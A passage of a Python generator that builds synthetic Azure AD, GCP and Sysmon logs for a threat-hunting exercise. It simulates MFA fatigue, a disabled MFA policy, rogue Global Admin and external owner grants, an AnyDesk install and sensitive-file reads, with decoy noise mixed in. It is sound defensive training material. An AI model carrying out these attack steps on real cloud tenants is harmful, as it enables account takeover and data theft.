    Covers:
    unc3944_exec_01 - MFA fatigue failures (error 500121)
    unc3944_exec_02 - Successful sign-in from same IP, anomalous geo
    unc3944_exec_03 - Conditional access policy disabled
    unc3944_exec_04 - Global Admin role assignment
    Includes decoy MFA failures from legitimate users to add noise.
    """
    src_ip = _rand_ip()
    admin_upn = 'admin@corp.onmicrosoft.com'
    attacker_svc = 'svc-monitoring@corp.onmicrosoft.com'

    events = []

    # Decoy - single MFA failure from legit user (noise)
    events.append({
        'time': _ts(base_time, 0),
        'category': 'SignInLogs',
        'operationName': 'Sign-in activity',
        'properties': {
            'userPrincipalName': 'j.baker@corp.onmicrosoft.com',
            'appDisplayName': 'Microsoft Teams',
            'ipAddress': _rand_ip(),
            'clientAppUsed': 'Mobile Apps and Desktop clients',
            'status': {'errorCode': 500121, 'failureReason': 'Authentication failed during strong authentication request.'},
            'authenticationDetails': [{'authenticationMethod': 'Phone app notification', 'succeeded': False}],
            'location': {'city': 'London', 'countryOrRegion': 'GB'},
            'conditionalAccessStatus': 'notApplied'
        },
        'sourcetype': 'azure:aad:signin', 'index': f'ghosttrace_{apt_id}', 'host': 'azure'
    })

    # MFA fatigue failures x5 against admin (T1621) - same IP, same account
    for i in range(5):
        events.append({
            'time': _ts(base_time, 60 + (i * 180)),
            'category': 'SignInLogs',
            'operationName': 'Sign-in activity',
            'properties': {
                'userPrincipalName': admin_upn,
                'appDisplayName': 'Azure Portal',
                'ipAddress': src_ip,
                'clientAppUsed': 'Browser',
                'status': {'errorCode': 500121, 'failureReason': 'Authentication failed during strong authentication request.'},
                'authenticationDetails': [{'authenticationMethod': 'Phone app notification', 'succeeded': False}],
                'location': {'city': 'Unknown', 'countryOrRegion': 'RO'},
                'conditionalAccessStatus': 'notApplied'
            },
            'sourcetype': 'azure:aad:signin', 'index': f'ghosttrace_{apt_id}', 'host': 'azure'
        })

    events += [
        # Successful sign-in after fatigue (same IP, anomalous geo)
        {
            'time': _ts(base_time, 1830),
            'category': 'SignInLogs',
            'operationName': 'Sign-in activity',
            'properties': {
                'userPrincipalName': admin_upn,
                'appDisplayName': 'Azure Portal',
                'ipAddress': src_ip,
                'clientAppUsed': 'Browser',
                'status': {'errorCode': 0, 'failureReason': None},
                'authenticationDetails': [{'authenticationMethod': 'Phone app notification', 'succeeded': True}],
                'location': {'city': 'Unknown', 'countryOrRegion': 'RO'},
                'conditionalAccessStatus': 'success'
            },
            'sourcetype': 'azure:aad:signin', 'index': f'ghosttrace_{apt_id}', 'host': 'azure'
        },
        # Conditional access policy disabled (T1556.006)
        {
            'time': _ts(base_time, 2105),
            'category': 'AuditLogs',
            'operationName': 'Update conditional access policy',
            'properties': {
                'initiatedBy': {'user': {'userPrincipalName': admin_upn, 'ipAddress': src_ip}},
                'targetResources': [{
                    'displayName': 'Require MFA for All Users',
                    'modifiedProperties': [
                        {'displayName': 'State', 'oldValue': '"enabled"', 'newValue': '"disabled"'}
                    ]
                }],
                'result': 'success'
            },
            'sourcetype': 'azure:aad:audit', 'index': f'ghosttrace_{apt_id}', 'host': 'azure'
        },
        # Decoy audit event - benign policy update (noise)
        {
            'time': _ts(base_time, 2200),
            'category': 'AuditLogs',
            'operationName': 'Update conditional access policy',
            'properties': {
                'initiatedBy': {'user': {'userPrincipalName': 'svc-monitor@corp.onmicrosoft.com', 'ipAddress': _rand_ip(private=True)}},
                'targetResources': [{
                    'displayName': 'Block Legacy Authentication',
                    'modifiedProperties': [
                        {'displayName': 'State', 'oldValue': '"disabled"', 'newValue': '"enabled"'}
                    ]
                }],
                'result': 'success'
            },
            'sourcetype': 'azure:aad:audit', 'index': f'ghosttrace_{apt_id}', 'host': 'azure'
        },
        # Global Admin role assignment (T1098)
        {
            'time': _ts(base_time, 2458),
            'category': 'AuditLogs',
            'operationName': 'Add member to role',
            'properties': {
                'initiatedBy': {'user': {'userPrincipalName': admin_upn, 'ipAddress': src_ip}},
                'targetResources': [
                    {'displayName': attacker_svc, 'type': 'User'},
                    {'displayName': 'Global Administrator', 'type': 'Role'}
                ],
                'result': 'success'
            },
            'sourcetype': 'azure:aad:audit', 'index': f'ghosttrace_{apt_id}', 'host': 'azure'
        },
        # Remote access tool deployed on endpoint post-AAD compromise
        {
            'EventID': 1,
            'EventTime': _ts(base_time, 3200),
            'Computer': 'WKSTN-BAKER', 'User': f'{DOMAIN}\\svc_backup',
            'Image': 'C:\\Users\\Public\\Downloads\\AnyDesk.exe',
            'CommandLine': 'AnyDesk.exe --install C:\\ProgramData\\AnyDesk --start-with-win',
            'ParentImage': 'C:\\Windows\\System32\\cmd.exe',
            'ParentCommandLine': 'cmd.exe /c C:\\Users\\Public\\Downloads\\AnyDesk.exe --install',
            'ProcessId': random.randint(5000, 9000),
            'ParentProcessId': random.randint(1000, 4000),
            'Hashes': f'SHA256={_rand_hash()}',
            'sourcetype': 'Sysmon', 'index': f'ghosttrace_{apt_id}', 'host': 'WKSTN-BAKER'
        },
        # EID3 - AnyDesk outbound connection
        {
            'EventID': 3,
            'EventTime': _ts(base_time, 3350),
            'Computer': 'WKSTN-BAKER', 'User': f'{DOMAIN}\\svc_backup',
            'Image': 'C:\\ProgramData\\AnyDesk\\AnyDesk.exe',
            'ProcessId': random.randint(5000, 9000),
            'DestinationIp': _rand_ip(),
            'DestinationPort': 443,
            'SourceIp': _rand_ip(private=True),
            'SourcePort': random.randint(49152, 65535),
            'Protocol': 'tcp',
            'Initiated': True,
            'DestinationHostname': 'relay.anydesk.com',
            'sourcetype': 'Sysmon', 'index': f'ghosttrace_{apt_id}', 'host': 'WKSTN-BAKER'
        },
    ]
    return events


# ── GCP attack events ──────────────────────────────────────────────────────

def _gcp_attack(base_time: datetime, apt_id: str) -> list:
    """
    Covers:
    apt41_exec_01 - SetIamPolicy (external SA added as owner)
    apt41_exec_02 - CreateServiceAccountKey (persistence)
    apt41_exec_03 - GCS data access (T1530)
    Includes decoy IAM events to make hunting harder.
    """
    src_ip = _rand_ip()
    svc_account = 'svc-deploy@corp-project.iam.gserviceaccount.com'
    attacker_sa = 'exfil-svc@attacker-project.iam.gserviceaccount.com'

    events = [
        # Decoy GetIamPolicy (legitimate looking recon)
        {
            'insertId': _rand_guid(),
            'timestamp': _ts(base_time, 0),
            'logName': 'projects/corp-project/logs/cloudaudit.googleapis.com%2Factivity',
            'protoPayload': {
                '@type': 'type.googleapis.com/google.cloud.audit.AuditLog',
                'methodName': 'GetIamPolicy',
                'serviceName': 'cloudresourcemanager.googleapis.com',
                'authenticationInfo': {'principalEmail': svc_account},
                'requestMetadata': {'callerIp': src_ip, 'callerSuppliedUserAgent': 'google-cloud-sdk'},
                'resourceName': 'projects/corp-project'
            },
            'sourcetype': 'gcp:audit', 'index': f'ghosttrace_{apt_id}', 'host': 'gcp'
        },
        # SetIamPolicy - external SA added as owner (T1098)
        {
            'insertId': _rand_guid(),
            'timestamp': _ts(base_time, 185),
            'logName': 'projects/corp-project/logs/cloudaudit.googleapis.com%2Factivity',
            'protoPayload': {
                '@type': 'type.googleapis.com/google.cloud.audit.AuditLog',
                'methodName': 'SetIamPolicy',
                'serviceName': 'iam.googleapis.com',
                'authenticationInfo': {'principalEmail': svc_account},
                'requestMetadata': {'callerIp': src_ip, 'callerSuppliedUserAgent': 'google-cloud-sdk'},
                'request': {'policy': {'bindings': [
                    {'role': 'roles/owner', 'members': [f'serviceAccount:{attacker_sa}']},
                    {'role': 'roles/viewer', 'members': ['serviceAccount:ops-team@corp-project.iam.gserviceaccount.com']}
                ]}},
                'resourceName': 'projects/corp-project'
            },
            'sourcetype': 'gcp:audit', 'index': f'ghosttrace_{apt_id}', 'host': 'gcp'
        },
        # CreateServiceAccountKey - persistence (T1098.001)
        {
            'insertId': _rand_guid(),
            'timestamp': _ts(base_time, 282),
            'logName': 'projects/corp-project/logs/cloudaudit.googleapis.com%2Factivity',
            'protoPayload': {
                '@type': 'type.googleapis.com/google.cloud.audit.AuditLog',
                'methodName': 'google.iam.admin.v1.CreateServiceAccountKey',
                'serviceName': 'iam.googleapis.com',
                'authenticationInfo': {'principalEmail': svc_account},
                'requestMetadata': {'callerIp': src_ip},
                'resourceName': f'projects/corp-project/serviceAccounts/{svc_account}'
            },
            'sourcetype': 'gcp:audit', 'index': f'ghosttrace_{apt_id}', 'host': 'gcp'
        },
        # Decoy storage list (looks like admin task)
        {
            'insertId': _rand_guid(),
            'timestamp': _ts(base_time, 400),
            'logName': 'projects/corp-project/logs/cloudaudit.googleapis.com%2Factivity',
            'protoPayload': {
                '@type': 'type.googleapis.com/google.cloud.audit.AuditLog',
                'methodName': 'storage.buckets.list',
                'serviceName': 'storage.googleapis.com',
                'authenticationInfo': {'principalEmail': svc_account},
                'requestMetadata': {'callerIp': src_ip},
                'resourceName': 'projects/corp-project'
            },
            'sourcetype': 'gcp:audit', 'index': f'ghosttrace_{apt_id}', 'host': 'gcp'
        },
        # GCS data access - sensitive employee records (T1530)
        {
            'insertId': _rand_guid(),
            'timestamp': _ts(base_time, 524),
            'logName': 'projects/corp-project/logs/cloudaudit.googleapis.com%2Fdata_access',
            'protoPayload': {
                '@type': 'type.googleapis.com/google.cloud.audit.AuditLog',
                'methodName': 'storage.objects.get',
                'serviceName': 'storage.googleapis.com',
                'authenticationInfo': {'principalEmail': svc_account},
                'requestMetadata': {'callerIp': src_ip},
                'resourceName': 'projects/_/buckets/corp-sensitive-data/objects/employee-records.csv'
            },
            'sourcetype': 'gcp:audit', 'index': f'ghosttrace_{apt_id}', 'host': 'gcp'
        },
        # GCS data access - second file
        {
            'insertId': _rand_guid(),
            'timestamp': _ts(base_time, 558),
            'logName': 'projects/corp-project/logs/cloudaudit.googleapis.com%2Fdata_access',
            'protoPayload': {
                '@type': 'type.googleapis.com/google.cloud.audit.AuditLog',
                'methodName': 'storage.objects.get',
                'serviceName': 'storage.googleapis.com',
                'authenticationInfo': {'principalEmail': svc_account},
                'requestMetadata': {'callerIp': src_ip},
                'resourceName': 'projects/_/buckets/corp-sensitive-data/objects/payroll-2024.csv'
            },
            'sourcetype': 'gcp:audit', 'index': f'ghosttrace_{apt_id}', 'host': 'gcp'
        },
    ]
    return events


# ── Main dispatcher ───────────────────────────────────────────────────────

def generate_logs(apt_id: str) -> list:
    all_logs = []

    # Run attack chain multiple times with different base times to create
    # realistic volume and make the signal harder to isolate
    for i in range(3):
        base_time = datetime.utcnow() - timedelta(hours=random.randint(1, 24))

        if apt_id == 'apt29':
            all_logs += _cloudtrail_attack(base_time, apt_id)
            all_logs += _sysmon_attack(base_time, apt_id)
            all_logs += _winevent_attack(base_time, apt_id)

        elif apt_id == 'apt28':
            all_logs += _sysmon_attack(base_time, apt_id)
            all_logs += _winevent_attack(base_time, apt_id)

        elif apt_id == 'lazarus':
            all_logs += _cloudtrail_attack(base_time, apt_id)
            all_logs += _sysmon_attack(base_time, apt_id)
            all_logs += _winevent_attack(base_time, apt_id)

        elif apt_id == 'apt41':
            all_logs += _gcp_attack(base_time, apt_id)
            all_logs += _sysmon_attack(base_time, apt_id)
            all_logs += _winevent_attack(base_time, apt_id)

        elif apt_id == 'unc3944':
            all_logs += _azure_aad_attack(base_time, apt_id)
            all_logs += _sysmon_attack(base_time, apt_id)
            all_logs += _winevent_attack(base_time, apt_id)

    # Noise layers - run once with a wide base time window
    noise_base = datetime.utcnow() - timedelta(hours=12)
    all_logs += _benign_sysmon(noise_base, apt_id, count=150)
    all_logs += _grey_sysmon(noise_base, apt_id, count=50)
    all_logs += _benign_4624(noise_base, apt_id, count=80)

    # Source-specific noise
    if apt_id in ('apt29', 'lazarus'):
        all_logs += _benign_cloudtrail(noise_base, apt_id, count=60)
    if apt_id == 'apt41':
        all_logs += _benign_cloudtrail(noise_base, apt_id, count=30)
        all_logs += _benign_gcp(noise_base, apt_id, count=50)
    if apt_id == 'unc3944':
        all_logs += _benign_azure_signin(noise_base, apt_id, count=70)

    # Sort by timestamp
    all_logs.sort(key=lambda x: (
        x.get('EventTime') or
        x.get('eventTime') or
        x.get('time') or
        x.get('timestamp') or ''
    ))

    return all_logs


def generate_index_file(apt_id: str) -> str:
    logs = generate_logs(apt_id)
    lines = [json.dumps(log) for log in logs]
    return '\n'.join(lines)
